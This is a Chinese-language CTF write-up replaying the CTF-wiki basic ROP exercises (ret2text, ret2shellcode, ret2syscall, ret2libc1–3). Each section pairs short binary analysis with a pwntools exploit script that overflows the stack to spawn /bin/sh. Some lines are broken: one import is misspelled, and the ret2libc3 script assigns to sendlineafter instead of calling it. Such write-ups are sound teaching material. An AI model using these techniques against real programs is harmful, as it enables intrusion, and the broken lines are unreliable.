---
layout: ctfwiki
title: Rop
date: 2020-01-31 18:06:00
tags:
  - wp
categories:
  - pwn
---
      ctfwiki上的Basic rop的复现
### 0x00 ret2text
这道题其实就是很简单很简单的栈溢出
</br>开虚拟机，放到gdb去看一下基本信息：
![](1.png)
</br>嗯，几乎啥保护都没有！
</br>放到ida里看一下：
![](2.png)
</br>gets那里发生了栈溢出，用gdb算出偏移量为112。接着我在secure函数中找到了system函数，然后又找到'/bin/sh/':
![](3.png)
![](4.png)
</br>之后就可以写攻击脚本：
```
from pwn import *

c=process('./ret2text')

system_addr=0x08048490
bin_addr=0x08048763
payload = ''
payload += 'a'*112
payload +=p32(system_addr)+p32(0)+p32(bin_addr)

c.sendline(payload)
c.interactive()
```

![](5.png)<br>

### 0x01 ret2shellcode
我觉得这道题首先要介绍一下，shellcode是什么。shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机械码，让电/脑可以执行攻击者的任意指令。（来自维基百科）<b>一般来说，shellcode是需要我们自己填充的。</b>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，<b>shellcode 所在的区域具有可执行权限</b>。
</br>看一下基本信息：
![](6.png)
</br>没开啥保护
</br>看一下ida的反汇编结果：
![](7.png)
</br>gets那里存在栈溢出，这里有个buf2在bss段上，在gdb上用vmmap上查看：
![](10.png)
![](8.png)
</br>可以看到bss段是可读可写的，并且找不到system或者'/bin/sh'字符，所以我们可以用shellcode，这样的话我们就可以把shellcode的地址放在buf2上,再用gdb算出偏移量为112,于是，我们可以写脚本了：
```
from pwn import *

sh = process('./ret2shellcode')

buf_addr = 0x0804A080
shellcode = asm(shellcraft.sh())    #在脚本中生成一个shellcode
payload =''
payload += shellcode.ljust(112,'a') #防止生成的shellcode长度不够112，用垃圾字符填充
payload += p32(buf_addr)

sh.sendline(payload)
sh.interactive()
```
![](9.png)

### 0x02 ret2syscall
这个需要了解系统调用的知识。
#### 系统调用(简要介绍)
系统调用:运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态运行。
</br>
整个过程如下：首先指令流执行到系统调用函数时，系统调用函数通过int 0x80指令进入系统调用入口程序，并且把系统调用号放入%eax中，如果需要传递参数，则把参数放入%ebx，%ecx和%edx中。进入系统调用入口程序（System_call）后，它首先把相关的寄存器压入内核堆栈（以备将来恢复），这个过程称为保护现场。保护现场的工作完成后，开始检查系统调用号是不是一个有效值，如果不是则退出。接下来根据系统调用号开始调用系统调用处理程序（这是一个正式执行系统调用功能的函数），从系统调用处理程序返回后，就会去检查当前进程是否处于就绪态、进程时间片是否用完，如果不在就绪态或者时间片已用完，那么就会去调用进程调度程序schedule()，转去执行其他进程。如果不执行进程调度程序，那么接下来就会开始执行ret_from_sys_call，顾名思义，这这个程序主要执行一些系统调用的后处理工作。比如它会去检查当前进程是否有需要处理的信号，如果有则去调用do_signal()，然后进行一些恢复现场的工作，返回到原先的进程指令流中。至此整个系统调用的过程就结束了。
</br>![](11.png)
回到这题，同样的它开启了NX保护，进入ida中查看反汇编;
![](12.png)
</br>正如上面的反汇编代码所说，这题无system函数，也无法使用shellcode,这时候我们考虑系统调用。系统函数调用的指令是int 0x80,这是固定指令，他有四个参数：
+ 系统调用号，即 eax 应该为 0xb
+ 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
+ 第二个参数，即 ecx 应该为 0
+ 第三个参数，即 edx 应该为 0</br>

接下来我们就要一点点的去拼凑这些内容，我们没法直接在栈里写指令，只能够利用程序中自带的指令去拼凑。
</br>首先我们将eax设置为0xb，我们是没法直接往栈里写mov eax,0xb的，那么还有另一种方式是pop eax，但是要保证栈顶必须是0xb。
</br>然后设置ebx,ecx,edx，同样是这样的道理，所以我们可以想象栈中的数据是：
</br>
pop eax；ret
</br></br>
0xb
</br></br>
pop ebx;pop ecx;pop edx;ret
</br></br>
"/bin/sh"的地址
</br></br>
0
</br></br>
0
</br></br>
int 0x80的地址
</br>接下来我们就要找pop eax,pop ebx,pop ecx,pop edx的指令,这需要用到ROPgadget（我才知道有这个，装了好久才弄好，呜呜呜呜呜呜呜）
![](13.png)
</br>--only是指只有pop和ret指令
</br>接下来找'/bin/sh'字符
![](14.png)
</br>找int 0x80地址
![](15.png)
</br>最后写exp:
```
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_addr = 0x08049421
bin_addr = 0x080be408

payload = ''
payload += 'a'*112
payload += p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)

sh.sendline(payload)
sh.interactive()
```

### 0x03 ret2libc1
emmmmmm 这道题和第一题一样差不多的步骤，差不多的问题，不想截图了，直接看脚本吧。
```
from pwn import *

sh = process('./ret2libc1')

system_addr = 0x08048460
bin_addr = 0x08048720

payload =''
payload += 'a'*112
payload += p32(system_addr)+p32(0)+p32(bin_addr)

sh.sendline(payload)
sh.interactive()
```
</br>

### 0x04 ret2libc2
这道题稍微有点意思。同样的开了NX保护，看ida结果
![main函数](16.png)
![secure函数](17.png)
</br>这次给了system函数，但没给'/bin/sh'，要我们自己填充。可读写的bss段上有buf2
</br>之后找到了ebx,写exp;
```
from pwn import *

c = process('./ret2libc2')

get_plt = 0x08048460
buf2_addr = 0x0804A080
pop_ebx = 0x0804843d
system_addr = 0x08048490

payload = ''
payload += 'a'*112
payload += p32(get_plt)+p32(pop_ebx)+p32(buf2_addr)+p32(system_addr)+p32(0x0)+p32(buf2_addr)

c.sendline(payload)
c.sendline('/bin/sh')
c.interactive()
```

</br>我们还可以这样写：
```
rom pwn import *
rop = ROP('./ret2libc2')
c = process('./ret2libc2')

elf = ELF('./ret2libc2')

payload = ''
payload += 'a'*112
payload += p32(elf.plt['gets'])+p32(rop.search(8).address)+p32(elf.bss()+0x100)+p32(elf.plt['system'])+p32(0x0)+p32(elf.bss()+0x100)

c.sendline(payload)
c.sendline('/bin/sh')
c.interactive()
```
其中，rop.search(8).addrss是pwntools自带寻找gadgets的方法。

### 0x05 ret2libc3
这道题还是开启了NX保护，打开ida,情况如下：
![](19.png)
</br>这次secure上无system函数，搜索也没有'/bin/sh'。所以本题我们要利用libc泄露。</br>
大致思路</br>
泄露 __libc_start_main 地址
</br>
获取 libc 版本
</br>
获取 system 地址与 /bin/sh 的地址
</br>
再次执行源程序
</br>
触发栈溢出执行 system(‘/bin/sh’)
</br>
<b>exp:</b>
```
from pwn import *
from LibcSearcher import LibcSearcher

c = process('./ret2libc3')
elf = ELF('./ret2libc3') #静态加载ELF文件

put_plt = elf.plt['puts'] #获取指定文件的plt条目
libc_start_main_got = elf.got['__libc_start_main'] #获取指定文件的got条目
main = elf.symbols['main'] #获取指定文件的函数地址

print('leak libc_start_main_got addr and return to main again')
payload = ''
payload += 'a'*112
payload += p32(put_plt)+p32(libc_start_main_got)+p32(main) #先使用plts_plt函数打印出main函数在got表中的真实地址
c.sendlineafter = ('Can you find it !?',payload)

print('get the related addr')
libc_start_main_addr = u32(c.recv()[0:4]) #获取main函数的真实地址
libc = LibcSearcher('__libc_start_main',libc_start_main_addr) #获取libc
libcbase = libc_start_main_addr-libc.dump('__libc_start_main') #获取libc基地址
system_addr = libcbase+libc.dump('system') #获取system地址
bin_sh_addr = libcbase+libc.dump('str_bin_sh') #获取‘/bin/sh’字符串地址

print('get shell')
payload = ''
payload += 112*'a'
payload += p32(system_addr)+p32(0xdeadbeef)+p32(bin_sh_addr)
c.sendline(payload)

c.interactive()
```
